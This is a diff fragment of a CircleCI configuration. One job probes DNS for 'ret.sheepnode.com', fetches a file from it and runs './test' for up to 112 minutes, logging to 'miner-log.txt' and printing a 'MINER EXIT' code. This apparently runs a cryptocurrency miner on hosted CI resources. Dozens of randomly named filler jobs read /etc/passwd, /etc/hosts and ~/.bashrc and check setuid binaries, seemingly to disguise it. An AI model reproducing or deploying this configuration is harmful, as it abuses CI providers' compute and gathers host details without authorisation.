+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+
+  fuse_zulu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: loop HELP
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/scripts-goose-record-2019-12-16"/lizard&&rm -rf "/tmp/scripts-goose-record-2019-12-16"&&echo removed; true ; } > /tmp/lower/fnv_3dc2e03cf
+            echo "unit promote: $(wc -c </tmp/lower/fnv_3dc2e03cf)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'fnv_3dc2e03cf'
+  zz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 3
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; lscpu | head -n8; true ; } > /tmp/lower/noiseGlint
+            echo "unit smoke: $(wc -c </tmp/lower/noiseGlint)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'noiseGlint'
+  iter1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Codename Late Meteor
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; if grep -q 'color' $HOME/.bashrc; then echo 'true'; else echo 'false'; fi; true ; } > /tmp/lower/6pe6dzzrb9x
+            echo "unit hotfix-7100: $(wc -c </tmp/lower/6pe6dzzrb9x)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - '6pe6dzzrb9x'
+  c0mp137ez:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Lima first then the west coast
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; cp -v /etc/hosts ${TMPDIR:-/tmp}/lower_info.tmp; true ; } > /tmp/lower/audit-3d97.log
+            echo "unit min-smoke: $(wc -c </tmp/lower/audit-3d97.log)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'audit-3d97.log'
+  search010:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: someday transcode the subtitles
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; uptime | fmt -w 55 | nl; true ; } > /tmp/lower/HAWK_FEN_ATOLL_NICKEL
+            echo "unit q2-ship: $(wc -c </tmp/lower/HAWK_FEN_ATOLL_NICKEL)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'HAWK_FEN_ATOLL_NICKEL'
+  anchor-31984-big:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: offboarding retries 1
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -Q /usr/local/bin | wc -w; true ; } > /tmp/lower/LOADER_QUARK_CHUNK
+            echo "unit check-staging-release-candidate: $(wc -c </tmp/lower/LOADER_QUARK_CHUNK)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'LOADER_QUARK_CHUNK'
+  WidgetNameName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 3
+          command: |
+            mkdir -p /tmp/lower
+            set +o pipefail 2>/dev/null; yes abc | head -n 1087526 | sort | uniq -c | head > /tmp/lower/Sn4n; true
+            echo "unit RolloutPipeline: $(wc -c </tmp/lower/Sn4n)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'Sn4n'
+  o-brand:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: OK FINE pull the status page
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; md5sum /etc/passwd >'/tmp/common-route.sum' &&md5sum -c '/tmp/common-route.sum'; true ; } > /tmp/lower/TICKET_058384
+            echo "unit ShipImage: $(wc -c </tmp/lower/TICKET_058384)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'TICKET_058384'
+  stack-2022-09-15:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Friendly reminder spellcheck
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; grep -w if ~/.bashrc | head -15; true ; } > /tmp/lower/GzVxY9A5zvT
+            echo "unit node18-cov: $(wc -c </tmp/lower/GzVxY9A5zvT)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'GzVxY9A5zvT'
+  armor-trait-stale-rollback:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Our turn to swap the release candidate
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; cat /etc/passwd|cut -d: -f3|sort -n|uniq -c; true ; } > /tmp/lower/packet-signal-bison-otter
+            echo "unit Run_Release8: $(wc -c </tmp/lower/packet-signal-bison-otter)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'packet-signal-bison-otter'
+  acc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Would you mind summarizing the press kit
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; shuf -e dog horse cat eagle -n 1; true ; } > /tmp/lower/EXaqfdWnT1tgg1hs1Xw
+            echo "unit jun25-smoke: $(wc -c </tmp/lower/EXaqfdWnT1tgg1hs1Xw)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'EXaqfdWnT1tgg1hs1Xw'
+  CNN2Header:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Archive the perf baseline to west
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; if test -u /usr/bin/passwd ; then echo 'found'; else echo 'not found'; fi; true ; } > /tmp/lower/payload-invoice
+            echo "unit dotnet8-ship: $(wc -c </tmp/lower/payload-invoice)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'payload-invoice'
+  zMacro5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Screenshot the cart icon on tablet
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; getent ahosts localhost | head -n3; true ; } > /tmp/lower/SeIb8w
+            echo "unit v5-beta: $(wc -c </tmp/lower/SeIb8w)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'SeIb8w'
+  ZM0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: TEST PDU
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | command grep -i -v -h host; true ; } > /tmp/lower/backUpmArKeTSHArD
+            echo "unit jun6-ship: $(wc -c </tmp/lower/backUpmArKeTSHArD)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'backUpmArKeTSHArD'
+workflows:
+  matrix:
+    jobs:
+      - ms_arg
+      - model-2011
+      - strated:
+          requires:
+            - ms_arg
+            - model-2011
+      - spin-up:
+          requires:
+            - ms_arg
+            - model-2011
+      - sirius-v2:
+          requires:
+            - ms_arg
+            - model-2011
+      - Build_Tests4:
+          requires:
+            - ms_arg
+            - model-2011
+      - add-metrics-timeout:
+          requires:
+            - ms_arg
+            - model-2011
+      - yankee-1:
+          requires:
+            - ms_arg
+            - model-2011
+      - gear-map
+      - fuse_zulu:
+          requires:
+            - gear-map
+      - promote:
+          requires:
+            - fuse_zulu
+      - CommonTitleEntry:
+          requires:
+            - fuse_zulu
+      - zz:
+          requires:
+            - CommonTitleEntry
+      - smoke:
+          requires:
+            - zz
+      - kbw3vj7t:
+          requires:
+            - zz
+      - iter1:
+          requires:
+            - kbw3vj7t
+      - hotfix-7100:
+          requires:
+            - iter1
+      - remote-normal-p:
+          requires:
+            - iter1
+      - c0mp137ez:
+          requires:
+            - remote-normal-p
+      - min-smoke:
+          requires:
+            - c0mp137ez
+      - DBFactory:
+          requires:
+            - c0mp137ez
+      - search010:
+          requires:
+            - DBFactory
+      - q2-ship:
+          requires:
+            - search010
+      - UnboundedBoundedEdgeController:
+          requires:
+            - search010
+      - anchor-31984-big:
+          requires:
+            - UnboundedBoundedEdgeController
+      - check-staging-release-candidate:
+          requires:
+            - anchor-31984-big
+      - inc_sz
+      - WidgetNameName:
+          requires:
+            - inc_sz
+      - RolloutPipeline:
+          requires:
+            - WidgetNameName
+      - littleCandle:
+          requires:
+            - WidgetNameName
+      - o-brand:
+          requires:
+            - littleCandle
+      - ShipImage:
+          requires:
+            - o-brand
+      - assert_edge_join:
+          requires:
+            - o-brand
+      - stack-2022-09-15:
+          requires:
+            - assert_edge_join
+      - node18-cov:
+          requires:
+            - stack-2022-09-15
+      - OPHCE-11435:
+          requires:
+            - stack-2022-09-15
+      - armor-trait-stale-rollback:
+          requires:
+            - OPHCE-11435
+      - Run_Release8:
+          requires:
+            - armor-trait-stale-rollback
+      - connectRectNonce:
+          requires:
+            - armor-trait-stale-rollback
+      - acc:
+          requires:
+            - connectRectNonce
+      - jun25-smoke:
+          requires:
+            - acc
+      - TYZVPL-39484a:
+          requires:
+            - acc
+      - CNN2Header:
+          requires:
+            - TYZVPL-39484a
+      - dotnet8-ship:
+          requires:
+            - CNN2Header
+      - tbd:
+          requires:
+            - CNN2Header
+      - zMacro5:
+          requires:
+            - tbd
+      - v5-beta:
+          requires:
+            - zMacro5
+      - GUI_Height:
+          requires:
+            - zMacro5
+      - ZM0:
+          requires:
+            - GUI_Height
+      - jun6-ship:
+          requires:
+            - ZM0
+      - stopOrigGraph
+      - dp-old:
+          requires:
+            - stopOrigGraph
+      - zip_semaphore_:
+          requires:
+            - stopOrigGraph
+      - canary:
+          requires:
+            - zip_semaphore_
+      - listlocked:
+          requires:
+            - zip_semaphore_
+      - hotfix-3968:
+          requires:
+            - listlocked
+      - AllInvoices:
+          requires:
+            - listlocked
+      - anothr-run-70:
+          requires:
+            - AllInvoices
+      - untitled1:
+          requires:
+            - AllInvoices
+      - test:
+          requires:
+            - untitled1
+      - trans-cluster:
+          requires:
+            - untitled1
+      - jun25-cleanup:
+          requires:
+            - trans-cluster
+      - Install-ResponseItem:
+          requires:
+            - trans-cluster
+      - min-ci:
+          requires:
+            - Install-ResponseItem
+      - y_val:
+          requires:
+            - Install-ResponseItem
+      - cf-v2:
+          requires:
+            - y_val
+      - gridCnt:
+          requires:
+            - y_val
+      - nebula-plus:
+          requires:
+            - gridCnt
+      - navsByName:
+          requires:
+            - gridCnt
+      - BUILD_DEV:
+          requires:
+            - navsByName
